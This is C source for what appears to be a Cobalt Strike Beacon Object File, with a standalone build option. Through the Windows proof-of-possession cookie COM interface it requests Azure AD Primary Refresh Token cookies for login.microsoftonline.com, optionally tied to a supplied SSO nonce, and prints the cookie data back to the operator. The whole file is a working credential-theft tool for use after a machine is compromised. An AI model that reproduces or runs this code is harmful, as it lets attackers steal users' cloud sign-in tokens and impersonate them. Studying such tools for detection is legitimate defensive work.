#include <windows.h>
#include "base.c"
#include <stdio.h>


int requestaadprt(LPCWSTR nonce) {

	LPCWSTR uri = L"https://login.microsoftonline.com/";
	wchar_t * full_uri = NULL;
	// We have a nonce, let's build the URL for it
	if (nonce != NULL) {
		const wchar_t * base_url = L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=";
		
		full_uri = (wchar_t*)MSVCRT$calloc(MSVCRT$wcslen(base_url) + MSVCRT$wcslen(nonce) + 2, sizeof(wchar_t));
		if(full_uri == NULL){
			internal_printf("Failed to initialize memory.\n");
			return 1;
		}
		KERNEL32$lstrcpynW(full_uri, base_url, MSVCRT$wcslen(base_url) + MSVCRT$wcslen(nonce));
		KERNEL32$lstrcatW(full_uri, nonce);
		uri = full_uri;
	}

	internal_printf("Using uri: %ls\n", uri);
	DWORD cookieCount = 0;
	ProofOfPossessionCookieInfo* cookies;
	IProofOfPossessionCookieInfoManager* popCookieManager;
	GUID CLSID_ProofOfPossessionCookieInfoManager;
	GUID IID_IProofOfPossessionCookieInfoManager;

	OLE32$CLSIDFromString(L"{A9927F85-A304-4390-8B23-A75F1C668600}", &CLSID_ProofOfPossessionCookieInfoManager);
	OLE32$IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &IID_IProofOfPossessionCookieInfoManager);

	HRESULT hr = OLE32$CoInitializeEx(NULL, 0x0);
	if (FAILED(hr))	{
		internal_printf("CoInitialize error: %d\n", hr);
		return 0;
	}

	hr = OLE32$CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, &IID_IProofOfPossessionCookieInfoManager, (void**)(&popCookieManager));
	if (FAILED(hr))	{
		internal_printf("CoCreateInstance error: %d\n", hr);;
		return 0;
	}

	hr = popCookieManager->lpVtbl->GetCookieInfoForUri(popCookieManager, uri, &cookieCount, &cookies);
	if (FAILED(hr))	{
		internal_printf("GetCookieInfoForUri error: %d\n", hr);
		return 0;
	}

	if (cookieCount == 0) {
		internal_printf("No cookies for the URI\n");
		return 0;
	}

	for (DWORD i = 0; i < cookieCount; i++) {
		internal_printf("Name %ls\n", cookies[i].name);
		internal_printf("Name: %ls\n", cookies[i].name);
		internal_printf("Data: %ls\n", cookies[i].data);
		internal_printf("Flags: %x\n", cookies[i].flags);
		internal_printf("P3PHeader: %ls\n\n", cookies[i].p3pHeader);

		OLE32$CoTaskMemFree(cookies[i].name);
		OLE32$CoTaskMemFree(cookies[i].data);
		OLE32$CoTaskMemFree(cookies[i].p3pHeader);
	}
	OLE32$CoTaskMemFree(cookies);
	MSVCRT$free(full_uri);
	
	internal_printf("DONE\n");

	return 0;
}

#ifdef BOF
VOID go( 
	IN PCHAR Args, 
	IN ULONG Length 
) {
	datap parser;
	const wchar_t * nonce = NULL;

	BeaconDataParse(&parser, Args, Length);
	nonce = (const wchar_t*)  BeaconDataExtract(&parser, NULL);
	
	if(!bofstart()) {
		return;
	}

	requestaadprt(nonce);
	printoutput(TRUE);
	bofstop();
};
#else
int main(int argc, char *argv[]) {
	// Convert char * argument to wchar_t argument.
	wchar_t * nonce;
	if (argc == 2) {
		size_t length = MSVCRT$strlen(argv[1]) + 1;
		nonce = (wchar_t*)MSVCRT$calloc(length, sizeof(wchar_t));

		if(nonce == NULL) {
			internal_printf("Failed to initialize memory.\n");
			return 1;
		}

		MSVCRT$mbstowcs_s(NULL, nonce, length, argv[1], length - 1);

	} else {
		nonce = NULL;
	}

	requestaadprt(nonce);
	return 1;
	// code for standalone exe for scanbuild / leak checks
}
#endif
